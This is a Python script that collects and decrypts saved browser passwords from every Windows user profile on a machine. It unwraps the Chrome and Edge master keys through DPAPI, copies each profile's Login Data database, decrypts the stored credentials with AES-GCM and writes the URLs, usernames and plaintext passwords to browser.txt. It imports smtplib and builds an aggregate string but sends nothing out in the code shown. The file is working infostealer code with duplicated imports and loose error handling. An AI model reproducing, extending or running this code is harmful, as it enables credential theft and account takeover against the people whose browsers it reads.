import os
import time
import sqlite3
import json
import base64
import shutil
from datetime import datetime, timedelta
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome
from sqlite3 import Error
from pathlib import Path
import smtplib
import subprocess
import re
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime


FileName = 116444736000000000
NanoSeconds = 10000000


def ConvertDate(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')


def get_master_key():
    try:
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State',
              "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    except:
        print('edge not installed!')
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"


def get_password(key2, user, profile):
    master_key = key2
    login_db = rf'C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\{profile}\Login Data'
    try:
        shutil.copy2(login_db,
                     "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
    except:
        return ''
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
            	with open('browser.txt', 'a') as f:
            		f.write(url + '\n' + username + '\n' + decrypted_password + '\n'*2)
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass


try:
	users = [x.name for x in Path(r'C:\Users').glob('*') if x.name not in ['Default', 'Default User', 'Public', 'All Users'] and x.is_dir()]
except:
	pass


def broswer_creds(db_file, encrypted_key):
	try:
		shutil.copy2(db_file,"LoginvaultChrome.db")
		conn = None
		conn = sqlite3.connect('LoginvaultChrome.db')
		#print('connected to:' ,db_file)
		message = '-'*100 + '\n'*2
		cursor = conn.cursor()
		cursor.execute("SELECT action_url, username_value, password_value FROM logins")
		for index,login in enumerate(cursor.fetchall()):
			url = login[0]
			username = login[1]
			ciphertext= login[2]
			#print("Url:",url)
			#print("Username:",username)
			initialisation_vector = ciphertext[3:15]
			encrypted_password = ciphertext[15:-16]
			cipher = AES.new(encrypted_key, AES.MODE_GCM, initialisation_vector)
			decrypted_pass = cipher.decrypt(encrypted_password)
			decrypted_pass = decrypted_pass.decode()
			#print("Password:", decrypted_pass)
			message = message + url + '\n' + username + '\n' + decrypted_pass + '\n'*2
			with open('browser.txt', 'a') as f:
				f.write(url + '\n' + username + '\n' + decrypted_pass + '\n'*2)
		message = message + '-' * 100

		cursor.close()
		os.remove("LoginvaultChrome.db")
		return message
	except:
		try:
			os.remove("LoginvaultChrome.db")
		except:
			pass
		return ''

all_data = ''
for user in users:
	message = ''
	try:
		with open(rf'C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State', 'r') as f:
			data = f.read()
			data = json.loads(data)
			os_crypt = data['os_crypt']
			encrypted_key = os_crypt['encrypted_key']
			encrypted_key = base64.b64decode(encrypted_key)
			encrypted_key = encrypted_key[5:]
			key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

		profiles = []
		profiles2 = []
		key2 = get_master_key()
		items = os.listdir(fr'C:\Users\{user}\AppData\Local\Google\Chrome\User Data')
		items2 = os.listdir(fr'C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data')
		for item in items:
			if item.find('Profile') != -1 or item == 'Default':
				profiles.append(item)
		for item in items2:
			if item.find('Profile') != -1 or item == 'Default':
				profiles2.append(item)
		for profile in profiles:
			loc = f'C:/Users/{user}/AppData/Local/Google/Chrome/User Data/{profile}/Login Data'
			newmsgs =  broswer_creds(loc, key)
			message = message + newmsgs
		all_data = all_data + message
		for profile in profiles2:
			get_password(key2, user, profile)

	except:
		print(f'Error before connection')

try:
	os.remove("LoginvaultChrome.db")
except:
	pass

